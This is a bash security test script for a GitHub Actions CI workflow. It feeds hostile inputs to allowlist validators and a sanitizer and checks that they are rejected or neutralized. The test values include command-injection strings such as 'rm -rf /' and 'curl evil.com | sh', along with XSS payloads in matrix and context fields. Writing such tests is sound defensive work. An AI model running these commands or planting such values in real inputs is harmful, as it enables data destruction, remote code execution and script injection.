#!/bin/bash
###############################################################
# Copyright (©) 2024-2025 David H Hoyt. All rights reserved.
###############################################################
#                 https://srd.cx
#
# Last Updated: 17-DEC-2025 1700Z by David Hoyt
#
# Intent: Try Sanitizing User Controllable Inputs
#
#
# 
#
# Comment: Sanitizing User Controllable Input 
#          - is a Moving Target
#          - needs ongoing updates
#          - needs additional unit tests
#
#
#
###############################################################
set -euo pipefail
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Load sanitizer
if [ -r "$SCRIPT_DIR/sanitize.sh" ]; then
  # shellcheck disable=SC1091
  source "$SCRIPT_DIR/sanitize.sh"
else
  echo "ERROR: sanitize.sh not found" >&2
  exit 1
fi

echo "Testing Unix Workflow Sanitization"
echo "==================================="
echo ""

# Simulate the matrix values from ci-pr-unix.yml
# These come from user input via workflow_call
test_matrix_validation() {
  echo "Test: Matrix Input Validation"
  echo "------------------------------"
  
  # Simulate malicious matrix inputs
  ATTACK_OS='ubuntu-latest"; rm -rf /; echo "'
  ATTACK_COMPILER='gcc; curl evil.com | sh'
  ATTACK_BUILD_TYPE='Release && malicious'
  
  echo "Simulating malicious matrix inputs:"
  echo "  OS: $ATTACK_OS"
  echo "  Compiler: $ATTACK_COMPILER"
  echo "  Build Type: $ATTACK_BUILD_TYPE"
  echo ""
  
  # Test validation logic from ci-pr-unix.yml (lines 96-107)
  validate_os() {
    local os="$1"
    case "$os" in
      ubuntu-latest|macos-latest) return 0 ;;
      *) return 1 ;;
    esac
  }
  
  validate_compiler() {
    local comp="$1"
    case "$comp" in
      gcc|clang) return 0 ;;
      *) return 1 ;;
    esac
  }
  
  validate_build_type() {
    local bt="$1"
    case "$bt" in
      Release|Debug) return 0 ;;
      *) return 1 ;;
    esac
  }
  
  # Test each malicious input
  if validate_os "$ATTACK_OS"; then
    echo "  ❌ FAIL: Malicious OS accepted"
    return 1
  else
    echo "  ✅ PASS: Malicious OS rejected"
  fi
  
  if validate_compiler "$ATTACK_COMPILER"; then
    echo "  ❌ FAIL: Malicious compiler accepted"
    return 1
  else
    echo "  ✅ PASS: Malicious compiler rejected"
  fi
  
  if validate_build_type "$ATTACK_BUILD_TYPE"; then
    echo "  ❌ FAIL: Malicious build type accepted"
    return 1
  else
    echo "  ✅ PASS: Malicious build type rejected"
  fi
  
  echo ""
  return 0
}

# Test sanitization of GitHub context variables
test_context_sanitization() {
  echo "Test: GitHub Context Variable Sanitization"
  echo "-------------------------------------------"
  
  # Simulate hostile GitHub context (lines 124-141 in ci-pr-unix.yml)
  GITHUB_EVENT_NAME='pull_request<script>alert(1)</script>'
  GITHUB_BASE_REF='master; rm -rf /'
  GITHUB_HEAD_REF='feature/<img src=x onerror=alert(1)>'
  GITHUB_ACTOR='attacker"; curl evil.com'
  
  echo "Simulating hostile GitHub context:"
  echo "  Event: $GITHUB_EVENT_NAME"
  echo "  Base: $GITHUB_BASE_REF"
  echo "  Head: $GITHUB_HEAD_REF"
  echo "  Actor: $GITHUB_ACTOR"
  echo ""
  
  # Workflow sanitizes these (line 260-262)
  safe_event=$(sanitize_line "$GITHUB_EVENT_NAME")
  safe_base=$(sanitize_line "$GITHUB_BASE_REF")
  safe_head=$(sanitize_line "$GITHUB_HEAD_REF")
  safe_actor=$(sanitize_line "$GITHUB_ACTOR")
  
  echo "Sanitized values:"
  echo "  Event: $safe_event"
  echo "  Base: $safe_base"
  echo "  Head: $safe_head"
  echo "  Actor: $safe_actor"
  echo ""
  
  # Verify no XSS
  if echo "$safe_event$safe_base$safe_head$safe_actor" | grep -qE '(<script|<img|onerror="|javascript:")' 2>/dev/null; then
    echo "  ❌ FAIL: XSS vector not neutralized"
    return 1
  else
    echo "  ✅ PASS: All context variables properly sanitized"
  fi
  
  echo ""
  return 0
}

# Test summary generation (line 264-266)
test_summary_generation() {
  echo "Test: Workflow Summary Generation"
  echo "----------------------------------"
  
  # Simulate values from matrix and context
  MATRIX_OS='ubuntu-latest'
  MATRIX_COMPILER='<script>evil</script>'
  MATRIX_BUILD_TYPE='Release'
  
  echo "Simulating workflow summary with hostile compiler:"
  echo "  OS: $MATRIX_OS"
  echo "  Compiler: $MATRIX_COMPILER"
  echo "  Build Type: $MATRIX_BUILD_TYPE"
  echo ""
  
  # Sanitize as workflow does (line 260-262)
  SANITIZED_OS=$(sanitize_line "$MATRIX_OS")
  SANITIZED_COMPILER=$(sanitize_line "$MATRIX_COMPILER")
  SANITIZED_BUILD_TYPE=$(sanitize_line "$MATRIX_BUILD_TYPE")
  
  # Generate summary as workflow does (line 263-266)
  SUMMARY=$(mktemp)
  {
    echo "## 🧱 ci-pr-unix Build Summary"
    echo "- **OS:**         $SANITIZED_OS"
    echo "- **Compiler:**   $SANITIZED_COMPILER"
    echo "- **Build Type:** $SANITIZED_BUILD_TYPE"
  } > "$SUMMARY"
  
  echo "Generated summary:"
  cat "$SUMMARY"
  echo ""
  
  # Verify no script tags in summary
  if grep -q '<script' "$SUMMARY"; then
    echo "  ❌ FAIL: XSS in summary"
    rm -f "$SUMMARY"
    return 1
  else
    echo "  ✅ PASS: Summary is safe"
  fi
  
  rm -f "$SUMMARY"
  echo ""
  return 0
}

# Test shell hardening
test_shell_hardening() {
  echo "Test: Shell Hardening Configuration"
  echo "------------------------------------"
  
  # Verify our test environment matches workflow (line 69, 75, 85, etc.)
  echo "Checking shell configuration:"
  echo "  BASH_ENV: ${BASH_ENV:-not set}"
  
  if [ "${BASH_ENV:-/dev/null}" = "/dev/null" ]; then
    echo "  ✅ PASS: BASH_ENV properly set to /dev/null"
  else
    echo "  ⚠️  WARNING: BASH_ENV not set (acceptable for local test)"
  fi
  
  # Verify GITHUB_TOKEN is unset (line 90, 123, etc.)
  if [ -z "${GITHUB_TOKEN:-}" ]; then
    echo "  ✅ PASS: GITHUB_TOKEN is not set"
  else
    echo "  ⚠️  WARNING: GITHUB_TOKEN is set (should be unset in workflow)"
  fi
  
  echo ""
  return 0
}

# Run all tests
echo "Starting Unix Workflow Security Tests..."
echo ""

PASS=0
FAIL=0

run_test() {
  local test_func="$1"
  if $test_func; then
    PASS=$((PASS + 1))
  else
    FAIL=$((FAIL + 1))
  fi
}

run_test test_matrix_validation
run_test test_context_sanitization
run_test test_summary_generation
run_test test_shell_hardening

echo "=========================================="
echo "Test Results: $PASS passed, $FAIL failed"
echo "=========================================="
echo ""

if [ $FAIL -eq 0 ]; then
  echo "✅ All Unix workflow security tests PASSED"
  echo ""
  echo "The ci-pr-unix workflow properly:"
  echo "  - Validates matrix inputs against allowlists"
  echo "  - Sanitizes GitHub context variables"
  echo "  - Generates safe workflow summaries"
  echo "  - Uses shell hardening configuration"
  echo ""
  exit 0
else
  echo "❌ Some tests FAILED"
  echo ""
  echo "Review the failures above and ensure:"
  echo "  - All user input is validated"
  echo "  - Sanitizers are used for output"
  echo "  - Shell hardening is enabled"
  echo ""
  exit 1
fi
